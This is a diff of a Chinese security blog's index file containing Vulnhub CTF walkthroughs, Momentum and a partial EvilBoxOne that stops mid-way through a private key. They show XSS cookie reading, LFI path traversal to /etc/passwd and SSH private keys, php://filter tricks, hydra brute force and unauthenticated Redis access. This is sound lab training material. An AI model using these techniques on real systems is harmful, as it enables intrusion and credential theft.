@@ -1124,106 +1124,6 @@
       </tags>
   </entry>
   <entry>
-    <title>16 Vulnhub Momentum Writeup</title>
-    <url>/2022/04/26/16%20Vulnhub%20Momentum%20Writeup/</url>
-    <content><![CDATA[<p>该靶机难度中等，如果之前就知道redis相关漏洞的话，那难度就是简单。</p>
-<span id="more"></span>
-<h1 id="靶机信息">1. 靶机信息</h1>
-<p>靶机地址：</p>
-<ul>
-<li><a href="https://www.vulnhub.com/entry/momentum-1,685/">Momentum: 1 ~ VulnHub</a></li>
-</ul>
-<p>难度：</p>
-<ul>
-<li>中</li>
-</ul>
-<p>目标：</p>
-<ul>
-<li>拿到root权限</li>
-<li>拿到2个flag</li>
-</ul>
-<p>涉及攻击方法：</p>
-<ul>
-<li>主机发现</li>
-<li>端口扫描</li>
-<li>信息收集</li>
-<li>Web路径爆破</li>
-<li><strong>JS脚本分析</strong></li>
-<li><strong>AES解密</strong></li>
-<li><strong>Redis认证漏洞</strong></li>
-</ul>
-<p>参考：</p>
-<ul>
-<li><a href="https://www.freebuf.com/articles/web/249238.html">Redis系列漏洞总结 - FreeBuf网络安全行业门户</a></li>
-<li><a href="http://www.npmdoc.org/crypto-jszhongwenwendangcrypto-js-jszhongwenjiaochengjiexi.html">crypto-js资料</a></li>
-</ul>
-<h1 id="渗透">2. 渗透</h1>
-<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.239</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.239</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426160344.png" /></p>
-<p>信息：</p>
-<ul>
-<li>22端口的服务位ssh</li>
-<li>80端口的服务为http</li>
-<li>靶机操作系统为Debian</li>
-</ul>
-<h2 id="访问http服务-get-shell">2.2. 访问http服务 + get shell</h2>
-<h3 id="http服务">2.2.1. http服务</h3>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426160525.png" /></p>
-<p>网站的页面有四张图片，并且这些图片可以点击，第一次点击可以放大图片，第二次点击就会显示图片的详细信息。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426160616.png" /></p>
-<p>注意到url中有一个参数id，并且id的值和这张图片的name是一样的。如果id随便输入，会发现页面显示的和我们输入的是一样的</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426160756.png" /></p>
-<p>之前说过，这种情况下可能存在着三种类型的漏洞：</p>
-<ol type="1">
-<li>SQL注入、</li>
-<li>XSS</li>
-<li>SSTI</li>
-</ol>
-<p>经过尝试，只存在XSS漏洞，但是目前还没有什么用。</p>
-<p>查看源码也没发现多少有用的信息，接下来进行路径扫描。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426161035.png" /></p>
-<p>经过对所有目录的查看，最终发现/js/main.js中的代码有点奇怪： <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">viewDetails</span>(<span class="params">str</span>) </span>&#123;                                                                                </span><br><span class="line">  <span class="built_in">window</span>.location.href = <span class="string">&quot;opus-details.php?id=&quot;</span>+str;                                                       </span><br><span class="line">&#125;                                                                                                          </span><br><span class="line"><span class="comment">/*                                                                                                       </span></span><br><span class="line"><span class="comment">var CryptoJS = require(&quot;crypto-js&quot;);                                                                       </span></span><br><span class="line"><span class="comment">var decrypted = CryptoJS.AES.decrypt(encrypted, &quot;SecretPassphraseMomentum&quot;);</span></span><br><span class="line"><span class="comment">console.log(decrypted.toString(CryptoJS.enc.Utf8));</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p>
-<p>（我不怎么会js）根据对代码的分析，我们刚刚输入的id，然后会经过viewDetails定位到对应的文件，然后返回相关信息，如果没有对应的文件，就直接显示id的值。这里的重点在于注释部分，<strong>先是调用了crypto-js库，然后调用了解密方法，最后将解密的结果变成字符串</strong>。</p>
-<p>经过搜索，发现这个库的decrypt方法的使用如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426161944.png" /></p>
-<p>因此猜测 SecretPassphraseMomentum 就是解密的密钥，那么现在就需要找到加密后的字符串解密就可以了。</p>
-<p>这时候想到了之前得到的XSS漏洞，一般XSS都和cookie有关，因此利用该漏洞查看一下cookie的值（也可以直接抓包） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>得到cookie的值 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cookie=U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt</span><br></pre></td></tr></table></figure></p>
-<p>随便找一个AES在线解密平台，解密得到一串字符： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auxerre-alienum##</span><br></pre></td></tr></table></figure></p>
-<h3 id="get-shell">2.2.2. get shell</h3>
-<p>现在只有一个ssh需要用户名和密码，因此尝试登录，最终的用户名和密码为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名: auxerre</span><br><span class="line">密码: auxerre-alienum##</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426162538.png" /></p>
-<h2 id="权限提升">2.3. 权限提升</h2>
-<p>首先进行信息收集，发现靶机的内核版本不是最新的</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426162635.png" /></p>
-<p>因此尝试用msf搜索，虽然有几个可以利用的exp，但是经尝试，都无法提权。最终在查看 /etc/passwd 的时候发现了一个特殊的用户 redis</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426162742.png" /></p>
-<p>这是一个非关系型的数据库，一直都有许多的安全问题。其中有一个<strong>未授权认证的漏洞</strong>，就是只要部署了redis，那么就会监听所有的网卡，并且只要能够访问到当前主机，那么都可以访问到redis，不需要经过认证就可以进行操作！redis默认监听6479端口，因此先查看端口，看一下是否启用了redis</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426163318.png" /></p>
-<p>发现确实启用了。那么直接访问 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli <span class="comment"># 访问redis</span></span><br><span class="line">info <span class="comment"># 查看相关信息，如果能显示，说明存在未授权认证漏洞</span></span><br><span class="line">keys * <span class="comment"># 获取所有键</span></span><br><span class="line">get keyName <span class="comment"># 获取键的信息</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426163858.png" /></p>
-<p>利用得到的密码登录root</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426163932.png" /></p>
-<p>最后，读取2个flag: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 1. /hoem/auxerre/user.txt</span><br><span class="line">[ Momentum - User Owned ]</span><br><span class="line">---------------------------------------</span><br><span class="line">flag : 84157165c30ad34d18945b647ec7f647</span><br><span class="line">---------------------------------------</span><br><span class="line"></span><br><span class="line">// 2. /root/toot.txt</span><br><span class="line">[ Momentum - Rooted ]</span><br><span class="line">---------------------------------------</span><br><span class="line">Flag : 658ff660fdac0b079ea78238e5996e40</span><br><span class="line">---------------------------------------</span><br><span class="line">by alienum with &lt;3</span><br></pre></td></tr></table></figure></p>
-<h1 id="总结">3. 总结</h1>
-<p>该靶机难度中等。我在打靶过程中遇到了两个问题：</p>
-<ol type="1">
-<li>我也找到了XSS漏洞和JS代码，但是没有将两者联想起来；</li>
-<li>之前从来没有遇到过redis，不知道这是什么；</li>
-</ol>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>综合</tag>
-        <tag>vulnhub</tag>
-        <tag>JS脚本分析</tag>
-        <tag>Redis认证漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>15 Vulnhub Ripper Writeup</title>
     <url>/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/</url>
     <content><![CDATA[<p>该靶机难度为中、低，涉及到了rips这个之前没有了解过的工具。</p>
@@ -1351,6 +1251,106 @@
         <tag>备份文件泄密</tag>
         <tag>CVE-2021-3493</tag>
         <tag>Webmin漏洞利用</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>16 Vulnhub Momentum Writeup</title>
+    <url>/2022/04/26/16%20Vulnhub%20Momentum%20Writeup/</url>
+    <content><![CDATA[<p>该靶机难度中等，如果之前就知道redis相关漏洞的话，那难度就是简单。</p>
+<span id="more"></span>
+<h1 id="靶机信息">1. 靶机信息</h1>
+<p>靶机地址：</p>
+<ul>
+<li><a href="https://www.vulnhub.com/entry/momentum-1,685/">Momentum: 1 ~ VulnHub</a></li>
+</ul>
+<p>难度：</p>
+<ul>
+<li>中</li>
+</ul>
+<p>目标：</p>
+<ul>
+<li>拿到root权限</li>
+<li>拿到2个flag</li>
+</ul>
+<p>涉及攻击方法：</p>
+<ul>
+<li>主机发现</li>
+<li>端口扫描</li>
+<li>信息收集</li>
+<li>Web路径爆破</li>
+<li><strong>JS脚本分析</strong></li>
+<li><strong>AES解密</strong></li>
+<li><strong>Redis认证漏洞</strong></li>
+</ul>
+<p>参考：</p>
+<ul>
+<li><a href="https://www.freebuf.com/articles/web/249238.html">Redis系列漏洞总结 - FreeBuf网络安全行业门户</a></li>
+<li><a href="http://www.npmdoc.org/crypto-jszhongwenwendangcrypto-js-jszhongwenjiaochengjiexi.html">crypto-js资料</a></li>
+</ul>
+<h1 id="渗透">2. 渗透</h1>
+<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.239</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.239</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426160344.png" /></p>
+<p>信息：</p>
+<ul>
+<li>22端口的服务位ssh</li>
+<li>80端口的服务为http</li>
+<li>靶机操作系统为Debian</li>
+</ul>
+<h2 id="访问http服务-get-shell">2.2. 访问http服务 + get shell</h2>
+<h3 id="http服务">2.2.1. http服务</h3>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426160525.png" /></p>
+<p>网站的页面有四张图片，并且这些图片可以点击，第一次点击可以放大图片，第二次点击就会显示图片的详细信息。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426160616.png" /></p>
+<p>注意到url中有一个参数id，并且id的值和这张图片的name是一样的。如果id随便输入，会发现页面显示的和我们输入的是一样的</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426160756.png" /></p>
+<p>之前说过，这种情况下可能存在着三种类型的漏洞：</p>
+<ol type="1">
+<li>SQL注入、</li>
+<li>XSS</li>
+<li>SSTI</li>
+</ol>
+<p>经过尝试，只存在XSS漏洞，但是目前还没有什么用。</p>
+<p>查看源码也没发现多少有用的信息，接下来进行路径扫描。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426161035.png" /></p>
+<p>经过对所有目录的查看，最终发现/js/main.js中的代码有点奇怪： <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">viewDetails</span>(<span class="params">str</span>) </span>&#123;                                                                                </span><br><span class="line">  <span class="built_in">window</span>.location.href = <span class="string">&quot;opus-details.php?id=&quot;</span>+str;                                                       </span><br><span class="line">&#125;                                                                                                          </span><br><span class="line"><span class="comment">/*                                                                                                       </span></span><br><span class="line"><span class="comment">var CryptoJS = require(&quot;crypto-js&quot;);                                                                       </span></span><br><span class="line"><span class="comment">var decrypted = CryptoJS.AES.decrypt(encrypted, &quot;SecretPassphraseMomentum&quot;);</span></span><br><span class="line"><span class="comment">console.log(decrypted.toString(CryptoJS.enc.Utf8));</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p>
+<p>（我不怎么会js）根据对代码的分析，我们刚刚输入的id，然后会经过viewDetails定位到对应的文件，然后返回相关信息，如果没有对应的文件，就直接显示id的值。这里的重点在于注释部分，<strong>先是调用了crypto-js库，然后调用了解密方法，最后将解密的结果变成字符串</strong>。</p>
+<p>经过搜索，发现这个库的decrypt方法的使用如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426161944.png" /></p>
+<p>因此猜测 SecretPassphraseMomentum 就是解密的密钥，那么现在就需要找到加密后的字符串解密就可以了。</p>
+<p>这时候想到了之前得到的XSS漏洞，一般XSS都和cookie有关，因此利用该漏洞查看一下cookie的值（也可以直接抓包） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>得到cookie的值 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cookie=U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt</span><br></pre></td></tr></table></figure></p>
+<p>随便找一个AES在线解密平台，解密得到一串字符： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auxerre-alienum##</span><br></pre></td></tr></table></figure></p>
+<h3 id="get-shell">2.2.2. get shell</h3>
+<p>现在只有一个ssh需要用户名和密码，因此尝试登录，最终的用户名和密码为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名: auxerre</span><br><span class="line">密码: auxerre-alienum##</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426162538.png" /></p>
+<h2 id="权限提升">2.3. 权限提升</h2>
+<p>首先进行信息收集，发现靶机的内核版本不是最新的</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426162635.png" /></p>
+<p>因此尝试用msf搜索，虽然有几个可以利用的exp，但是经尝试，都无法提权。最终在查看 /etc/passwd 的时候发现了一个特殊的用户 redis</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426162742.png" /></p>
+<p>这是一个非关系型的数据库，一直都有许多的安全问题。其中有一个<strong>未授权认证的漏洞</strong>，就是只要部署了redis，那么就会监听所有的网卡，并且只要能够访问到当前主机，那么都可以访问到redis，不需要经过认证就可以进行操作！redis默认监听6479端口，因此先查看端口，看一下是否启用了redis</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426163318.png" /></p>
+<p>发现确实启用了。那么直接访问 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli <span class="comment"># 访问redis</span></span><br><span class="line">info <span class="comment"># 查看相关信息，如果能显示，说明存在未授权认证漏洞</span></span><br><span class="line">keys * <span class="comment"># 获取所有键</span></span><br><span class="line">get keyName <span class="comment"># 获取键的信息</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426163858.png" /></p>
+<p>利用得到的密码登录root</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426163932.png" /></p>
+<p>最后，读取2个flag: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 1. /hoem/auxerre/user.txt</span><br><span class="line">[ Momentum - User Owned ]</span><br><span class="line">---------------------------------------</span><br><span class="line">flag : 84157165c30ad34d18945b647ec7f647</span><br><span class="line">---------------------------------------</span><br><span class="line"></span><br><span class="line">// 2. /root/toot.txt</span><br><span class="line">[ Momentum - Rooted ]</span><br><span class="line">---------------------------------------</span><br><span class="line">Flag : 658ff660fdac0b079ea78238e5996e40</span><br><span class="line">---------------------------------------</span><br><span class="line">by alienum with &lt;3</span><br></pre></td></tr></table></figure></p>
+<h1 id="总结">3. 总结</h1>
+<p>该靶机难度中等。我在打靶过程中遇到了两个问题：</p>
+<ol type="1">
+<li>我也找到了XSS漏洞和JS代码，但是没有将两者联想起来；</li>
+<li>之前从来没有遇到过redis，不知道这是什么；</li>
+</ol>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>综合</tag>
+        <tag>vulnhub</tag>
+        <tag>JS脚本分析</tag>
+        <tag>Redis认证漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1809,6 +1809,175 @@
       </tags>
   </entry>
   <entry>
+    <title>6 Vulnhub EvilBoxOne Writeup</title>
+    <url>/2022/04/07/6%20Vulnhub%20EvilBoxOne%20Writeup/</url>
+    <content><![CDATA[<p>该靶机难度介于简单和中等之间。不过还是能够学到很多知识。</p>
+<span id="more"></span>
+<h1 id="靶机信息">靶机信息</h1>
+<p>靶机地址：<a href="https://www.vulnhub.com/entry/evilbox-one,736/">evilbox_one</a></p>
+<p>难度：Easy/Medium (Intermediate)</p>
+<p>目标：取得root权限 + 2 Flag</p>
+<p>涉及攻击方法：</p>
+<ul>
+<li>主机发现</li>
+<li>端口扫描</li>
+<li>强制访问（路径爆破）</li>
+<li><strong>参数爆破</strong></li>
+<li>文件包含</li>
+<li>PHP封装器（伪协议）</li>
+<li>任意文件读取</li>
+<li><strong>SSH公钥登录</strong></li>
+<li><strong>离线密码破解</strong></li>
+<li>系统权限漏洞利用</li>
+</ul>
+<h1 id="渗透">渗透</h1>
+<p>攻击机kali：10.0.2.4</p>
+<h2 id="主机发现">主机发现</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fping -gaq 10.0.2.0/24</span><br><span class="line"></span><br><span class="line">-a: 显示可ping通的目标</span><br><span class="line">-g: 生成目标列表(不能与 -f 同时使用)，可指定目标的开始和结束IP， 或者提供ip的子网掩码</span><br><span class="line">-q: 安静模式(不显示每个目标或每个ping的结果)</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406214147.png" /></p>
+<p>靶机的IP为：10.0.2.9</p>
+<h2 id="端口扫描">端口扫描</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.9</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406214333.png" /></p>
+<p>靶机打开了两个端口：22和80</p>
+<h2 id="端口服务发现">端口服务发现</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80 -A 10.0.2.9</span><br><span class="line"></span><br><span class="line">-A 等价于 -sV -sC -O 的组合</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406214416.png" /></p>
+<ul>
+<li>22端口的服务为ssh，这里其实可以尝试爆破</li>
+<li>80端口的服务为http，CMS是Apache2，版本为2.4.38</li>
+<li>靶机操作系统为Debian</li>
+<li>系统内核版本为 4.x或者5.x，该工具猜测为4.15-5.6</li>
+<li>其他信息</li>
+</ul>
+<h2 id="访问http服务">访问http服务</h2>
+<p>访问<code>10.0.2.9:80</code>发现是apache2的一个界面，没有其他信息了。此时看一下源码和抓包，发现都没有信息，因此直接进行路径爆破。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.9 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp,asp</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406220602.png" /></p>
+<p>发现了一个新的目录<code>/secret</code>，直接访问发现什么都没有，包括源码也是什么都没有。此时针对这个刚发现的目录再次进行路径爆破。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.9/secret -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp,asp</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406220925.png" /></p>
+<p>发现了在该目录下还存在着两个文件。把每一个都访问一下。发现两个文件的内容都为空。此时，有可能是该网页只有传入参数才能够显示一些内容，但是我们并不知道有哪些参数，并且参数的值应该为什么也不知道。这时候就可以利用<strong>参数爆破</strong>。</p>
+<h2 id="参数爆破">参数爆破</h2>
+<p>参数爆破时，参数值一般有两种情况：</p>
+<ol type="1">
+<li>数字、字母这些常见的值以及容易引起SQL注入的字符（如单引号）等；</li>
+<li>网页上可能存在文件包含（如果没有传入文件名，很有可能内容为空），此时就需要将网站已经存在的文件名作为参数值</li>
+</ol>
+<p>先尝试第一种情况： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w [参数字典]:PARAM -w [参数值字典]:VAL -u http://10.0.2.9/secret/evil.php?PARAM=VAL -fs 0</span><br><span class="line"></span><br><span class="line">-fs 过滤。 -fs 0 表示如果页面返回的内容为空则过滤（不显示）</span><br></pre></td></tr></table></figure></p>
+<p>发现没有任何结果。那么接下来尝试第二种情况： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://10.0.2.9/secret/evil.php?FUZZ=../index.html -fs 0</span><br><span class="line"></span><br><span class="line">如果只有一个参数，可以用上面，FUZZ会自动使用字典来代替</span><br></pre></td></tr></table></figure></p>
+<p>（这里因为<code>secret</code>目录下的<code>index.html</code>内容为空，所以使用网站目录下的<code>index.html</code>）</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406221820.png" /></p>
+<p>此时爆出一个参数名 command。我们用浏览器验证一下。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406221946.png" /></p>
+<p>发现确实存在，这像是<strong>文件包含漏洞</strong>，如果我们包含<code>evil.php</code>发现结果和直接访问是一样的。输入如下payload验证一下是否存在该漏洞： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.9/secret/evil.php?command=../../../../../etc/passwd</span><br></pre></td></tr></table></figure></p>
+<p>（Linux中 <code>cd ..</code> 是返回上一级目录，如果<code>cd ../../../../../</code>返回五次上级目录，如果不够5次，那就返回到根目录则停止。）</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406224234.png" /></p>
+<p>发现确实存在<strong>文件包含漏洞</strong>。</p>
+<h2 id="文件包含漏洞利用">文件包含漏洞利用</h2>
+<p>文件包含漏洞的利用一般有以下几种：</p>
+<ol type="1">
+<li>如果存在<strong>远程文件包含</strong>，则可以在自己的主机写一句话，然后让靶机包含该文件；</li>
+<li>如果不存在<strong>远程文件包含</strong>，利用伪协议往靶机写入一句话；</li>
+<li>如果前两者都不行，那么就利用伪协议进行信息收集；</li>
+</ol>
+<h3 id="远程文件包含">远程文件包含</h3>
+<p>先验证是否存在远程文件包含，随便在kali上写一个文件： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello world!</span><br></pre></td></tr></table></figure></p>
+<p>然后开启http服务（先用浏览器访问一下是否成功开启）： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl start apache2</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406222903.png" /></p>
+<p>最后，在url包含kali上的该文件，如果显示的内容与上图相同则说明存在远程包含。很可惜，结果是空，也就是不存在该漏洞。</p>
+<h3 id="伪协议写文件">伪协议写文件</h3>
+<blockquote>
+<p>php://filter默认是read，但是可以write！利用这个可以写一句话。但是可能没有写入的权限。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/write=convert.base64-decode/resource=test.php&amp;txt=aGVsbG8gd29ybGQ=</span><br><span class="line"></span><br><span class="line">hello world经过base64编码：aGVsbG8gd29ybGQ=</span><br></pre></td></tr></table></figure>
+<p>访问之后发现页面还是空白，并不知道是否成功写入（默认写在当前目录）。直接访问该文件验证一下。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406223423.png" /></p>
+<p>发现并没有写入成功，因此证明没有写文件的权限。</p>
+<h3 id="伪协议信息收集">伪协议信息收集</h3>
+<p>可以先读取<code>evil.php</code>的内容。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=evil.php</span><br></pre></td></tr></table></figure></p>
+<p>将得到的结果base64解码后得到： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这也说明了该文件确实存在<strong>文件包含漏洞</strong>。</p>
+<h2 id="边界突破get-shell">边界突破（GET SHELL）</h2>
+<h3 id="ssh爆破">SSH爆破</h3>
+<p>从之前的信息收集发现有两个账号： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash</span><br></pre></td></tr></table></figure></p>
+<p>因此尝试对这两个账号进行密码爆破。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l user.txt -p /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt ssh://10.0.2.9  </span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406225551.png" /></p>
+<p>发现并没有成功，当然也可能是我的字典太小了。因此尝试其他办法。</p>
+<h3 id="ssh私钥泄露ssh公钥登录">SSH私钥泄露（SSH公钥登录）</h3>
+<p>本来思路已经断了，就去搜索了一下，发现SSH除了密码登陆之外还可能存在着公钥登录，不过需要知道私钥，不过可以利用<strong>文件包含漏洞</strong>来读取私钥。</p>
+<p><strong>第一步，先判断以下靶机是否支持SSH公钥登录</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh mowree@10.0.2.9 -v</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406225910.png" /></p>
+<p>注意箭头指向的那句话，说明<code>mowree</code>存在公钥登录。（虽然root也存在，但是私钥和公钥文件一般保存在用户家目录，而我们肯定没有权限读取root目录下的文件，否则也不用get shell）</p>
+<p><strong>第二步，读取公钥和私钥的信息</strong></p>
+<blockquote>
+<p>如果支持公钥登录的话，那么该用户的家目录应该包含相关的信息，比如默认位置 公钥：<code>/home/username/.ssh/authorized_keys</code>（可以看到加密算法） 私钥：<code>/home/username/.ssh/id_rsa</code>（如果加密算法为rsa的话）</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10.0.2.9/secret/evil.php?<span class="built_in">command</span>=../../../../../home/mowree/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAXfEfC22Bpq40UDZ8QXeuQa6EVJPmW6BjB4Ud/knShqQ86qCUatKaNlMfdpzKaagEBtlVUYwit68VH5xHV/QIcAzWi+FNw0SB2KTYvS514pkYj2mqrONdu1LQLvgXIqbmV7MPyE2AsGoQrOftpLKLJ8JToaIUCgYsVPHvs9Jy3fka+qLRHb0HjekPOuMiq19OeBeuGViaqILY+w9h19ebZelN8fJKW3mX4mkpM7eH4C46J0cmbK3ztkZuQ9e8Z14yAhcehde+sEHFKVcPS0WkHl61aTQoH/XTky8dHatCUucUATnwjDvUMgrVZ5cTjr4Q4YSvSRSIgpDP2lNNs1B7 mowree@EvilBoxOne</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10.0.2.9/secret/evil.php?<span class="built_in">command</span>=../../../../../home/mowree/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
+<p>查看页面源码的格式比较好看（注意格式不要改变）： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E</span><br><span class="line">uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6</span><br><span class="line">hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe</span><br><span class="line">o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb</span><br><span class="line">+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot</span><br><span class="line">b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k</span><br><span 